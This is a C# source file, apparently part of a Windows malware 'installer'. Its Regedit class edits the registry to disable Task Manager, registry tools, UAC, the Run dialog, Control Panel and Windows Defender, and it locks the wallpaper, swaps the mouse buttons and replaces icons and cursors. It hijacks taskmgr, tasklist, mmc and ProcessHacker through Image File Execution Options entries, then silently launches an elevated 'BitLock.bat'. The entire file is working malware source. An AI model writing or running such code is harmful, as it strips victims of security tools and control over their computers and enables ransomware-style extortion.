using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace _1nstaller
{
    public class Regedit
    {
        static RegistryKey _reg;
        public static string _tempDir = Path.GetTempPath();

        public static void RegKey()
        {

            /**   -SET THE DEFAULT ICON OF THE .TXT FILES-   **/
            try { _reg = Registry.ClassesRoot.CreateSubKey(@"txtfile\DefaultIcon");
            _reg.SetValue("", _tempDir + "emojiicon.ico");
            _reg.Close(); }
            catch { }


            /**   --SET DEFAULT EXE ICON-   **/
            try { _reg = Registry.ClassesRoot.CreateSubKey(@"exefile\DefaultIcon");
            _reg.SetValue("", _tempDir + "emojiicon.ico");
            _reg.Close(); }
            catch { }


            /**   -SET WALLPAPER AND DISABLE THE POSSIBILITY OF CHANGE IT-   **/
            try { _reg = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop");
            _reg.SetValue("Wallpaper", _tempDir + "Wallpaper.jpg");
            _reg.Close(); }
            catch { }

            try { _reg = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop");
            _reg.SetValue("NoChangingWallpaper", "1", RegistryValueKind.DWord);
            _reg.Close(); }
            catch { }


            /**   -DISABLE TASK MANAGER AND REGEDIT-   **/
            try { _reg = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            _reg.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
            _reg.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
            _reg.Close(); }
            catch { }


            try { _reg = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            _reg.SetValue("EnableLUA", "0", RegistryValueKind.DWord); /**   -Disabling this policy disables the "administrator in Admin Approval Mode" user type-   **/
            _reg.SetValue("shutdownwithoutlogon", "0", RegistryValueKind.DWord); /**   -cant shutdown client in login (with button)-   **/
            _reg.SetValue("undockwithoutlogon", "0", RegistryValueKind.DWord);  /**   -undock the system without having log on-   **/
            _reg.SetValue("VerboseStatus", "1", RegistryValueKind.DWord); /**   -Cant show the status message on the shutdown-   **/
            _reg.Close(); }
            catch { }


            /**   -Auto Restart Shell-   **/
            try { _reg = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
            _reg.SetValue("AutoRestartShell", "1", RegistryValueKind.DWord);
            _reg.Close(); }
            catch { }



            /**   -Change Cursor-   **/
            try { _reg = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
            _reg.SetValue("Arrow", _tempDir + "emojicursor.cur");
            _reg.SetValue("AppStarting", _tempDir + "emojicursor.cur");
            _reg.SetValue("Hand", _tempDir + "emojicursor.cur");
            _reg.Close(); }
            catch { }


            /**   -Swap Mouse Button-   **/
            try { _reg = Registry.CurrentUser.CreateSubKey("Control Panel\\Mouse\\");
            _reg.SetValue("SwapMouseButtons", "1");
            _reg.Close(); }
            catch { }


            /**   -Disable Explorer-   **/
            try { _reg = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            _reg.SetValue("NoRun", "1", RegistryValueKind.DWord);
            _reg.SetValue("NoControlPanel", "1", RegistryValueKind.DWord);
            _reg.Close(); }
            catch { }


            /**   -Disable windows defender-   **/
            try { _reg = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender");
            _reg.SetValue("DisableAntiSpyware", "1", RegistryValueKind.DWord);
            _reg.Close(); }
            catch { }


            /**   -Run Bitlock-   **/
            try { _reg = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\tasklist.exe");
            _reg.SetValue("Debugger", _tempDir + @"\MainT.exe", RegistryValueKind.String);
            _reg.Close(); }
            catch { }

            try { _reg = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe");
            _reg.SetValue("Debugger", _tempDir + @"\MainT.exe", RegistryValueKind.String);
            _reg.Close(); }
            catch { }

            try { _reg = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe");
            _reg.SetValue("Debugger", _tempDir + @"\MainT.exe", RegistryValueKind.String);
            _reg.Close(); }
            catch { }

            try { _reg = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ProcessHacker.exe");
            _reg.SetValue("Debugger", _tempDir + @"\MainT.exe", RegistryValueKind.String);
            _reg.Close(); }
            catch { }

            try { _reg = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\tm.exe");
            _reg.SetValue("Debugger", _tempDir + @"\MainT.exe", RegistryValueKind.String);
            _reg.Close(); }
            catch { }

            try { _reg = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\control.exe");
            _reg.SetValue("Debugger", _tempDir + @"\MainT.exe", RegistryValueKind.String);
            _reg.Close(); }
            catch { }


            /**   -Execute BatchFile-   **/
            ExecuteBatch();
        }

        public static void ExecuteBatch()
        {
            ProcessStartInfo psi = new ProcessStartInfo(_tempDir + "BitLock.bat");
            psi.CreateNoWindow = true;
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.UseShellExecute = false;
            psi.Verb = "runas";
            Process.Start(psi);
        }
    }
}
